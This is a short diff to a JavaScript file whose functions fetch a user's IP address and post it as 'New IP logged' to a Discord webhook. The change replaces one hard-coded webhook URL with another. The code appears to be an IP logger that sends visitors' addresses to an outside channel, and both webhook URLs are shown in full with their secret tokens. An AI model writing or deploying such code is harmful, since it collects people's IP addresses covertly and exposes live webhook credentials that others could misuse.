@@ -5,7 +5,7 @@ async function getUserIP() {
 }
 
 async function sendToWebhook(ip) {
-    const webhookURL = 'https://discord.com/api/webhooks/1360750154365272178/bwM6tc9NmSQB9jm6v6h3mItziwLxWJp90RAQhCDXlTivFbexzBoTiC69jUCXSMFuo7Rc';
+    const webhookURL = 'https://discord.com/api/webhooks/1391300085341618299/eEiwWNdeasnHJMmn9adAbaRDRYDdbzr74WoxgoRef7Jw1VbYcD8OyM9w2C_QW-G_fPgA';
     const message = {
         content: `New IP logged: ${ip}`
     };
